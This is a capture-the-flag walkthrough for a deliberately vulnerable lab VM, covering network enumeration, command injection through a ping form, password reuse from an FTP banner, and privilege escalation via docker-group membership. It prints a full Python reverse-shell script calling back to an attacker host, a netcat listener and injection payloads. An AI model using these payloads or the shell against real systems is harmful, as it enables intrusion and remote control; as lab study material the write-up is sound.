# Table of Contents

- [Enumeration](#enumeration)
- [Penetration](#penetration)
- [Escelation](#escelation)
- [Bonus](#bonus)
	- [CLI](#cli)
	- [Intresting Files](#intresting-files)


---

## Enumeration
- VM IP: `sudo netdiscover`
	* `192.168.0.12     08:00:27:89:20:c1      1      60  VMWare`
- VM info: `nmap -A 192.168.0.12`
	* `21/tcp open  ftp` Anonymous log-in is on. --> FTP Banner "ftp 'Security@hackNos'"
	* `22/tcp open  ssh`
	* `80/tcp open  http`
- web server info: `dirb -w http://192.168.0.12` 
	* http://192.168.0.12/index.html
	* http://192.168.0.12/css/style.css
	* http://192.168.0.12/css/2.jpg
- web server 192.168.0.12/5ecure login using:
	* admin:Security@hackNos <-- Banner
- web server info: `dirb -w http://192.168.0.12/5ecure`		
	* http://192.168.0.12/5ecure/index.html
		* form POSTs data to output.php
	* http://192.168.0.12/5ecure/css/style.css
	* http://192.168.0.12/5ecure/css/2.jpg
	* http://192.168.0.12/5ecure/output.php
		* simple ping <ip> function + stdout
---
	
## Penetration
- 192.168.0.12/5ecure/out.php:
	* `exec(ping $ip)`, possible shell injection 
- $ip = || command, '; + command', '&& + command', '& + command' didn't work out, char escape probably 
- Examples:
	- ip=|| ls 
		* system navigation
	* ip=|| whoami 
		* www-data
	* ip=|| vi *file*
		* privilege check
	* ip=|| export	

- [intresting files](#intresting-files):
	* /var/opt/python.py, creates a connection to 192.168.0.104:4444 and runs an interactive shell
	* /etc/passwd, user information
---

## Escelation
- `ssh 192.168.0.12 -l recon`
	* pass: Security@hackNos
- `docker run -it --privileged --name=ctf -v /:/host:rw alpine sh`
- container: `cd /host`
---

## Bonus

### CLI 
_Bonus, not necessary_
- configurate host/attacking machine network settings
	* add a new network connection and manualy set it up:
		- IP: 192.168.0.104
		- Netmask: 255.255.255.0
		- Gateway: 192.168.0.1
		- connect to the network using the new interface
- `nc -lvp 4444` to initiate a listener on 4444
- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
- tty: `python -c 'import pty; pty.spawn("/bin/bash")'`
- `getent group`: 
	* `docker:x:119:`, passwd --> `recon:x:1000:119:rahul:/home/recon:/bin/bash`
	* recon user gid = docker 
---

### Intresting files

- /var/opt/python.py:
	```
	import socket
	import subprocess
	import os
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.104", 4444))
	os.dup2(s.fileno(), 0)
	os.dup2(s.fileno(), 1)
	os.dup2(s.fileno(), 2)
	p = subprocess.call(["/bin/bash", "-i"])
	```
- /var/etc:
	```
	root:x:0:0:root:/root:/bin/bash
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	recon:x:1000:119:rahul:/home/recon:/bin/bash
	ftp:x:111:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
	```
